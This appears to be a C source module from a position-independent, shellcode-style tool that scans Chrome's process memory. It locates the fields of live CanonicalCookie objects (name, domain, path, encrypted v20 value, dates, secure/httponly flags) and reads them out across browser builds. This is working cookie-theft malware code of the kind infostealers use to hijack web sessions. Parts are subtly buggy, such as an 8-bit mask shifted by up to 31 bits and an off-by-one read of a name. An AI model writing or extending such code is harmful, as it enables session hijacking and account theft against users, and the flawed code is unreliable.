#define PIC_CODE_SECTION_NAME ".text$H"
#include "margaret.h"
#include "cc_layout.h"

/*
 * CanonicalCookie layout calibration — the module that derives every
 * struct offset at runtime.  Nothing is pinned: each field is located
 * by an invariant that holds for any build of the class (C++ ABI,
 * libc++ string format, ProcessBound layout, RFC 6265 semantics).
 * Quorum semantics (> n/2) tolerate legal minorities (empty values,
 * empty names, corrupt cookies); any ambiguity fails closed.
 */

/* --- byte readers (same pattern as resolve.c/adapter.c) --- */

PIC_CODE pic_u32 cc_read_u32(const pic_u8 *data)
{
    return (pic_u32)((pic_u32)data[0] |
                     ((pic_u32)data[1] << 8u) |
                     ((pic_u32)data[2] << 16u) |
                     ((pic_u32)data[3] << 24u));
}

PIC_CODE pic_u64 cc_read_u64(const pic_u8 *data)
{
    return (pic_u64)cc_read_u32(data) |
           ((pic_u64)cc_read_u32(data + 4) << 32u);
}

/* --- libc++ SSO string reader --- */

/*
 * Read a Chromium libc++ string (24 bytes on x64).  Short strings (<= 22
 * bytes) have inline data and the length in byte 23 (bit 7 clear).
 * Long strings have a heap pointer at +0 and length at +8.
 * Returns PIC_FALSE when the string is malformed.
 */
PIC_CODE pic_bool cc_read_string(const pic_u8 *string,
                                                  PIC_CC_STRING_VIEW *view)
{
    pic_u8 size_byte;
    pic_u64 pointer;

    if (string == PIC_NULL || view == PIC_NULL) {
        return PIC_FALSE;
    }

    size_byte = string[23];
    if ((size_byte & 0x80u) == 0u) {
        /* short: data is inline, length in byte 23 */
        view->data = string;
        view->length = (pic_u32)(size_byte & 0x7Fu);
        return PIC_TRUE;
    }

    /* long: pointer at +0, length at +8 */
    pointer = cc_read_u64(string);
    view->length = (pic_u32)cc_read_u64(string + 8);
    if (pointer == 0 || view->length == 0u || view->length > 4096u) {
        view->data = PIC_NULL;
        view->length = 0u;
        return PIC_FALSE;
    }
    view->data = (const pic_u8 *)pointer;
    return PIC_TRUE;
}


/*
 * True when p looks like a live heap pointer in user space: above the
 * null page, below the user-space cap, and 8-byte aligned (libc++ tree
 * nodes and partition-alloc chunks are).  False positives are fine: the
 * vtable check on the cookie is the authoritative gate.
 */
PIC_CODE pic_bool cc_ptr_plausible(pic_uptr p)
{
    pic_u32 hi;
    /* user space on Win10+ is below 128 TB: any pointer whose high 16
     * bits are set is not a live heap address (also covers negatives).
     * Split into 32-bit ops so no 64-bit immediate is materialized. */
    if (p < 0x10000u || (p & 7u) != 0u) {
        return PIC_FALSE;
    }
    hi = (pic_u32)(p >> 32u);
    return (hi >> 16u) == 0u;
}


/* True when p sits in a committed, readable, non-guarded region.  Used
 * to vet untrusted pointers read out of a candidate instance before any
 * dereference: VirtualQuery costs nothing next to an AV. */
PIC_CODE pic_bool cc_region_ok(const void *p,
                                             PIC_CC_MBI *mbi,
                                             PIC_CC_VQ_FN vq)
{
    pic_u32 state;
    pic_u32 prot;
    if (vq(p, mbi, sizeof(*mbi)) == 0u) {
        return PIC_FALSE;
    }
    state = cc_read_u32((const pic_u8 *)mbi + MBI_OFF_STATE);
    prot = cc_read_u32((const pic_u8 *)mbi + MBI_OFF_PROTECT);
    return state == MEM_COMMIT && (prot & 0xEEu) != 0u &&
           (prot & PAGE_GUARD) == 0u;
}


/* --- CanonicalCookie layout calibration --------------------------------
 *
 * Nothing in the struct is pinned: every field offset is derived at
 * runtime from a sample of live cookies, using invariants that hold
 * for ANY build of the class (C++ ABI + libc++ + Chromium semantics):
 *
 *   strings   libc++ std::string is 24 bytes; the short form is
 *             non-empty printable ASCII (len byte at +23, bit 7
 *             clear), the long form a plausible heap pointer with
 *             length in [23, 4096].
 *   path      the string whose first byte is '/' in every cookie.
 *   domain    the string containing '.' in every cookie.
 *   name      the string directly before domain; name_, domain_ and
 *             path_ are three CONSECUTIVE 24-byte members (declaration
 *             order) — validated by the stride, never assumed.
 *   value     the only string after path whose data is non-printable
 *             in at least one cookie (v20 stores the value as
 *             ProcessBound ciphertext; name/domain/path never are).
 *   flag      the byte after the value string whose value equals the
 *             ciphertext indicator for every sampled cookie.
 *   creation  the Time-like qword (µs since 1601) holding each
 *             cookie's minimum timestamp.
 *   expiry    the Time-like qword that is zero for session cookies,
 *             or each cookie's strict maximum when no session cookie
 *             is present (live cookies expire strictly in the future).
 *   same/port the u32 pair immediately before the value string,
 *             accepted only when bounded (enum <= 3, port <= 0xFFFF);
 *             otherwise both serialize as zero.
 *
 * Calibration needs CAL_SAMPLE_MIN cookies and inspects at most
 * CAL_SAMPLE_MAX; any ambiguity or violated invariant fails closed:
 * the whole snapshot returns UNSUPPORTED_BUILD with no cookies. */
#define CAL_STR_SCAN_LO   0x08u
#define CAL_STR_SCAN_HI   0xF8u
#define CAL_STR_MAX       8u
#define CAL_TIME_MAX      16u
/* Time-like qword: µs since 1601.  Real cookie timestamps live in
 * [2008 (Chrome birth), ~2100 (400-day clamp horizon)]: hi32 of the
 * qword in [2900000, 3700000] — a window so narrow that struct junk
 * (hashes, packed enums) cannot reach the majority quorum.  Checked
 * on the high 32 bits so no 64-bit immediate is ever materialized
 * (the raw gate rejects movabs). */
#define CAL_TIME_HI_MIN   2900000u
#define CAL_TIME_HI_MAX   3700000u

static PIC_CODE pic_u8 cc_cal_printable(pic_u8 b)
{
    return (pic_u8)((b >= 0x20u && b <= 0x7Eu) ||
                    b == 0x09u || b == 0x0Au || b == 0x0Du);
}

/* valid non-empty libc++ string at cookie+o for ONE cookie */
static PIC_CODE pic_bool cc_cal_string_at(
    const pic_u8 *cookie, pic_u32 o, PIC_CC_VQ_FN vq,
    PIC_CC_MBI *mbi, PIC_CC_STRING_VIEW *view)
{
    pic_u8 size_byte = cookie[o + 23u];
    pic_u32 i;

    if (!cc_read_string(cookie + o, view)) {
        return PIC_FALSE;
    }
    if ((size_byte & 0x80u) == 0u) {
        /* short: non-empty, printable, inline */
        if (view->length == 0u || view->length > 22u) {
            return PIC_FALSE;
        }
        for (i = 0u; i < view->length; ++i) {
            if (!cc_cal_printable(view->data[i])) {
                return PIC_FALSE;
            }
        }
        return PIC_TRUE;
    }
    /* long: heap-backed, length in the long-form range, pointer vetted */
    if (view->length < 23u) {
        return PIC_FALSE;
    }
    if (!cc_ptr_plausible((pic_uptr)view->data)) {
        return PIC_FALSE;
    }
    return cc_region_ok((const void *)view->data, mbi, vq);
}

/* count cookies whose string at o satisfies the role predicate:
 * CAL_ROLE_PATH — non-empty and starting '/'; CAL_ROLE_DOMAIN —
 * containing '.'.  The quorum logic of steps 2 and 3 is identical,
 * only the predicate differs. */
#define CAL_ROLE_PATH    0u
#define CAL_ROLE_DOMAIN  1u

static PIC_CODE pic_u32 cc_cal_role_count(
    const pic_u8 *const *sample, pic_u32 n, pic_u32 o,
    PIC_CC_VQ_FN vq, PIC_CC_MBI *mbi, pic_u32 role)
{
    PIC_CC_STRING_VIEW view;
    pic_u32 cnt = 0u;
    pic_u32 i;
    for (i = 0u; i < n; ++i) {
        if (cc_cal_string_at(sample[i], o, vq, mbi, &view)) {
            if (role == CAL_ROLE_PATH) {
                if (view.length != 0u && view.data[0u] == (pic_u8)'/') {
                    cnt++;
                }
            } else {
                pic_u32 b;
                for (b = 0u; b < view.length; ++b) {
                    if (view.data[b] == (pic_u8)'.') {
                        cnt++;
                        break;
                    }
                }
            }
        }
    }
    return cnt;
}

/* non-printable byte among the first 64 bytes of the string data */
static PIC_CODE pic_u8 cc_cal_nonprint(const PIC_CC_STRING_VIEW *v)
{
    pic_u32 n = v->length;
    pic_u32 i;
    if (n > 64u) {
        n = 64u;
    }
    for (i = 0u; i < n; ++i) {
        if (!cc_cal_printable(v->data[i])) {
            return 1u;
        }
    }
    return 0u;
}

/* strict Time-like: µs since 1601 in the plausible window */
static PIC_CODE pic_u8 cc_cal_timelike(pic_u64 v)
{
    pic_u32 hi = (pic_u32)(v >> 32u);
    return (pic_u8)(v != 0u &&
                    hi >= CAL_TIME_HI_MIN && hi <= CAL_TIME_HI_MAX);
}

/* Time-or-zero: strict Time-like or the session-cookie sentinel; used
 * only when hunting the expiry field, whose signature is MIXED zero
 * (session) and in-range (persistent) values across the sample — pure
 * zero padding never qualifies */
static PIC_CODE pic_u8 cc_cal_time_or_zero(pic_u64 v)
{
    return (pic_u8)(v == 0u || cc_cal_timelike(v) != 0u);
}

/* *diag receives the step number that failed (1..10) so the caller
 * can surface it through args->pad for live diagnosis */
#define CAL_FAIL(step) \
    do { \
        if (diag != PIC_NULL) { *diag = (step); } \
        return PIC_FALSE; \
    } while (0)

PIC_CODE pic_bool margaret_cc_calibrate(
    const pic_u8 *const *sample, pic_u32 n, PIC_CC_VQ_FN vq,
    PIC_CC_LAYOUT *lay, pic_u32 *diag)
{
    PIC_CC_MBI mbi;
    PIC_CC_STRING_VIEW view;
    pic_u32 str_offs[CAL_STR_MAX];
    pic_u32 nstr = 0u;
    pic_u32 t_offs[CAL_TIME_MAX];
    pic_u32 nt = 0u;
    pic_u8 nonprint[CAL_SAMPLE_MAX];
    pic_u32 off_name, off_domain, off_path, off_value, off_flag;
    pic_u32 off_creation, off_expiry, off_same, off_port;
    pic_u32 o, i, j, j2, k, cnt;
    pic_u32 quorum; /* strict majority of the sample (> n/2) */

    if (sample == PIC_NULL || lay == PIC_NULL || n < CAL_SAMPLE_MIN ||
        n > CAL_SAMPLE_MAX) {
        return PIC_FALSE;
    }
    quorum = n / 2u;

    /* 1) offsets holding a valid string in a quorum of cookies.
     * Empty strings are LEGAL (empty value, even an empty name): the
     * validator rejects them for that cookie alone, the quorum keeps
     * the offset a candidate. */
    for (o = CAL_STR_SCAN_LO; o < CAL_STR_SCAN_HI; o += 8u) {
        cnt = 0u;
        for (i = 0u; i < n; ++i) {
            if (cc_cal_string_at(sample[i], o, vq, &mbi, &view)) {
                cnt++;
            }
        }
        if (cnt > quorum) {
            if (nstr == CAL_STR_MAX) {
                CAL_FAIL(1u);
            }
            str_offs[nstr] = o;
            nstr++;
        }
    }
    if (nstr < 3u) {
        CAL_FAIL(1u);
    }

    /* 2) path: the string whose first byte is '/' in a quorum of the
     * cookies where it is valid (a stray ciphertext byte '/' cannot
     * reach the quorum).
     * 3) domain: the string containing '.' in a quorum of the valid
     * ones — same scaffold, different predicate */
    off_path = 0u;
    off_domain = 0u;
    {
        pic_u32 k_path = 0u;
        pic_u32 k_dom = 0u;
        for (j = 0u; j < nstr; ++j) {
            o = str_offs[j];
            if (cc_cal_role_count(sample, n, o, vq, &mbi,
                                        CAL_ROLE_PATH) > quorum) {
                k_path++;
                off_path = o;
            } else if (o != off_path &&
                       cc_cal_role_count(sample, n, o, vq, &mbi,
                                               CAL_ROLE_DOMAIN) > quorum) {
                k_dom++;
                off_domain = o;
            }
        }
        if (k_path != 1u) {
            CAL_FAIL(2u);
        }
        if (k_dom != 1u) {
            CAL_FAIL(3u);
        }
    }

    /* 4) name: declaration order name_, domain_, path_ = three
     * consecutive 24-byte strings; validate, never assume */
    off_name = off_domain - 0x18u;
    if (off_path != off_domain + 0x18u || off_name < CAL_STR_SCAN_LO) {
        CAL_FAIL(4u);
    }
    {
        pic_u8 member = 0u;
        for (j = 0u; j < nstr; ++j) {
            if (str_offs[j] == off_name) {
                member = 1u;
            }
        }
        if (member == 0u) {
            CAL_FAIL(4u);
        }
    }

    /* 5) value: a crypto::ProcessBound block — {ptr, len, cap, ...,
     * flag at +0x28} — NOT a libc++ string (its +23 byte carries no
     * long flag; the live dump proved it).  Candidate: majority of
     * cookies hold a plausible heap pointer at o and a length in
     * [1, 4096] at o+8; the value is the one whose pointed data is
     * non-printable in at least one cookie (v20 ciphertext). */
    off_value = 0u;
    k = 0u;
    /* 0x128 ceiling: the value block has landed below 0x128 in every
     * validated build (152-156) -- it is the current CanonicalCookie
     * size bound, not a struct guarantee.  A rebuild that moves the
     * value past it finds no candidate here and the whole calibration
     * fails closed at step 5 (UNSUPPORTED_BUILD), never a misread. */
    for (o = off_path + 0x18u; o < 0x128u; o += 8u) {
        pic_u8 any_ct = 0u;
        cnt = 0u;
        for (i = 0u; i < n; ++i) {
            pic_u64 ptr = cc_read_u64(sample[i] + o);
            pic_u64 len = cc_read_u64(sample[i] + o + 8u);
            if (cc_ptr_plausible((pic_uptr)ptr) &&
                len >= 1u && len <= 4096u &&
                cc_region_ok((const void *)(pic_uptr)ptr, &mbi, vq)) {
                cnt++;
                if (any_ct == 0u) {
                    PIC_CC_STRING_VIEW pv;
                    pv.data = (const pic_u8 *)(pic_uptr)ptr;
                    pv.length = (pic_u32)len;
                    if (cc_cal_nonprint(&pv) != 0u) {
                        any_ct = 1u;
                    }
                }
            }
        }
        if (cnt > quorum && any_ct != 0u) {
            k++;
            off_value = o;
        }
    }
    if (k != 1u) {
        CAL_FAIL(5u);
    }
    for (i = 0u; i < n; ++i) {
        pic_u64 ptr = cc_read_u64(sample[i] + off_value);
        pic_u64 len = cc_read_u64(sample[i] + off_value + 8u);
        PIC_CC_STRING_VIEW pv;
        pv.data = (const pic_u8 *)(pic_uptr)ptr;
        pv.length = (pic_u32)len;
        nonprint[i] = (cc_ptr_plausible((pic_uptr)ptr) &&
                       len >= 1u && len <= 4096u &&
                       cc_cal_nonprint(&pv) != 0u) ? 1u : 0u;
    }

    /* 6) flag: ProcessBound ABI position — value + 0x28; validated
     * against the ciphertext indicator on a quorum (positional like
     * the libc++ string ABI: an in-tree class, stable across builds) */
    off_flag = off_value + 0x28u;
    cnt = 0u;
    for (i = 0u; i < n; ++i) {
        if (sample[i][off_flag] == nonprint[i]) {
            cnt++;
        }
    }
    if (cnt <= quorum) {
        CAL_FAIL(6u);
    }

    /* 7) strict Time-like qwords between path and value (quorum) */
    for (o = off_path + 0x18u; o < off_value; o += 8u) {
        cnt = 0u;
        for (i = 0u; i < n; ++i) {
            if (cc_cal_timelike(cc_read_u64(sample[i] + o)) != 0u) {
                cnt++;
            }
        }
        if (cnt > quorum) {
            if (nt == CAL_TIME_MAX) {
                CAL_FAIL(7u);
            }
            t_offs[nt] = o;
            nt++;
        }
    }
    if (nt < 1u) {
        CAL_FAIL(7u);
    }

    /* 8) expiry — best effort, mirroring the historical behavior:
     * first a mixed signature (zero for session cookies, Time for
     * persistent ones), then a Time strictly ahead of creation;
     * otherwise 0 (the consumer defaults the date) */
    off_expiry = 0u;
    k = 0u;
    for (o = off_path + 0x18u; o < off_value; o += 8u) {
        pic_u8 allz = 1u;
        pic_u8 any0 = 0u;
        pic_u8 anynz = 0u;
        if (nt != 0u && o == t_offs[0]) {
            continue; /* creation itself */
        }
        for (i = 0u; i < n && allz != 0u; ++i) {
            pic_u64 v = cc_read_u64(sample[i] + o);
            if (cc_cal_time_or_zero(v) == 0u) {
                allz = 0u;
            } else if (v == 0u) {
                any0 = 1u;
            } else {
                anynz = 1u;
            }
        }
        if (allz != 0u && any0 != 0u && anynz != 0u) {
            k++;
            off_expiry = o;
        }
    }
    if (k > 1u) {
        CAL_FAIL(8u);
    }
    if (k == 0u && nt >= 2u) {
        /* no session/persistent mix visible: a Time strictly ahead of
         * the others for a quorum of cookies is the expiry; with a
         * single Time visible (all-session sample) expiry stays 0
         * (best effort — the consumer defaults the date) */
        for (j = 0u; j < nt; ++j) {
            o = t_offs[j];
            cnt = 0u;
            for (i = 0u; i < n; ++i) {
                pic_u8 ahead = 1u;
                for (j2 = 0u; j2 < nt && ahead != 0u; ++j2) {
                    if (t_offs[j2] != o &&
                        cc_read_u64(sample[i] + t_offs[j2]) >=
                            cc_read_u64(sample[i] + o)) {
                        ahead = 0u;
                    }
                }
                if (ahead != 0u) {
                    cnt++;
                }
            }
            if (cnt > quorum && (off_expiry == 0u || o > off_expiry)) {
                off_expiry = o;
            }
        }
    }

    /* 9) creation: the Time-like holding each cookie's minimum for a
     * quorum (ties allowed — creation_date_ is declared first, so the
     * LOWEST offset among the min-holders wins) */
    off_creation = 0u;
    for (j = 0u; j < nt; ++j) {
        cnt = 0u;
        o = t_offs[j];
        if (o == off_expiry) {
            continue;
        }
        for (i = 0u; i < n; ++i) {
            pic_u8 ismin = 1u;
            for (j2 = 0u; j2 < nt && ismin != 0u; ++j2) {
                if (j2 != j &&
                    cc_read_u64(sample[i] + t_offs[j2]) <
                        cc_read_u64(sample[i] + o)) {
                    ismin = 0u;
                }
            }
            if (ismin != 0u) {
                cnt++;
            }
        }
        if (cnt > quorum && (off_creation == 0u || o < off_creation)) {
            off_creation = o;
        }
    }
    if (off_creation == 0u || off_creation == off_expiry) {
        CAL_FAIL(9u);
    }

    /* 10) same_site/port: the u32 pair right before the value string,
     * accepted only when bounded in every cookie; zero otherwise */
    off_same = 0u;
    off_port = 0u;
    if (off_value >= 8u) {
        cnt = 0u;
        for (i = 0u; i < n; ++i) {
            if (cc_read_u32(sample[i] + off_value - 8u) <= 3u &&
                cc_read_u32(sample[i] + off_value - 4u) <= 0xFFFFu) {
                cnt++;
            }
        }
        if (cnt > quorum) {
            off_same = off_value - 8u;
            off_port = off_value - 4u;
        }
    }

    lay->off_name = off_name;
    lay->off_domain = off_domain;
    lay->off_path = off_path;
    lay->off_value = off_value;
    lay->off_flag = off_flag;
    lay->off_creation = off_creation;
    lay->off_expiry = off_expiry;
    lay->off_same_site = off_same;
    lay->off_port = off_port;
    lay->calibrated = 1u;
    return PIC_TRUE;
}

/* --- secure_/httponly_ calibration -------------------------------------
 *
 * Two adjacent bool members whose absolute offset drifts across
 * rebuilds.  The RFC 6265bis prefixes are ground truth the SITE
 * guarantees: __Secure- and __Host- cookies can only exist in the jar
 * with secure_=true (Chrome enforces it).  The candidate window is
 * anchored to the calibrated value flag (the two bools live shortly
 * after it); a 32-bit mask tracks surviving candidates.  When exactly
 * one remains that is secure_, httponly_ is the adjacent byte.
 * Fail-closed: ambiguity serializes the flags as 0. */
#define FLAGS_SCAN_WIDTH  0x20u   /* 32 candidate offsets */

PIC_CODE void margaret_cc_flags_update(
    PIC_FLAGS_CAL *cal, const pic_u8 *cookie, const pic_u8 *name,
    pic_u32 name_len)
{
    pic_u32 i;

    if (cal == PIC_NULL || cookie == PIC_NULL || cal->calibrated != 0u ||
        cal->window_base == 0u) {
        return;
    }

    /* __Secure- / __Host- prefixes force secure_=true (RFC 6265bis) */
    {
        pic_u8 is_secure = 0u;
        if (name_len >= 8u && name[0u] == (pic_u8)'_' &&
            name[1u] == (pic_u8)'_' && name[2u] == (pic_u8)'S' &&
            name[3u] == (pic_u8)'e' && name[4u] == (pic_u8)'c' &&
            name[5u] == (pic_u8)'u' && name[6u] == (pic_u8)'r' &&
            name[7u] == (pic_u8)'e' && name[8u] == (pic_u8)'-') {
            is_secure = 1u;
        } else if (name_len >= 7u && name[0u] == (pic_u8)'_' &&
                   name[1u] == (pic_u8)'_' && name[2u] == (pic_u8)'H' &&
                   name[3u] == (pic_u8)'o' && name[4u] == (pic_u8)'s' &&
                   name[5u] == (pic_u8)'t' && name[6u] == (pic_u8)'-') {
            is_secure = 1u;
        }

        for (i = 0u; i < FLAGS_SCAN_WIDTH; i++) {
            pic_u8 bit = 1u << i;
            if ((cal->candidates & bit) == 0u) {
                continue;
            }
            {
                pic_u8 b = cookie[cal->window_base + i];
                if (is_secure && b == 0u) {
                    cal->candidates &= (pic_u32)~bit;
                } else if (!is_secure && b != 0u) {
                    /* negative evidence only from names that carry no
                     * underscore prefix at all: underscore-leading
                     * analytics names (_ga, _fbp, ...) are sometimes
                     * Secure and must not eliminate the true offset */
                    if (name_len == 0u || name[0u] != (pic_u8)'_') {
                        cal->candidates &= (pic_u32)~bit;
                    }
                }
            }
        }

        if (cal->candidates != 0u &&
            (cal->candidates & (cal->candidates - 1u)) == 0u) {
            for (i = 0u; i < FLAGS_SCAN_WIDTH; i++) {
                if (cal->candidates & (1u << i)) {
                    cal->secure_off =
                        (pic_u8)(cal->window_base + i);
                    cal->calibrated = 1u;
                    return;
                }
            }
        }
        if (cal->candidates == 0u) {
            cal->calibrated = 2u; /* failed: contradictory evidence */
        }
    }
}

PIC_CODE pic_u32 margaret_cc_flags_read(
    const PIC_FLAGS_CAL *cal, const pic_u8 *cookie)
{
    if (cal == PIC_NULL || cookie == PIC_NULL || cal->calibrated != 1u) {
        return 0u; /* fail-closed */
    }
    /* bit 0 = secure_, bit 1 = httponly_ (adjacent bool) */
    {
        pic_u8 secure = cookie[cal->secure_off];
        pic_u8 httponly = cookie[cal->secure_off + 1u];
        return (pic_u32)(secure & 1u) | ((pic_u32)(httponly & 1u) << 1u);
    }
}

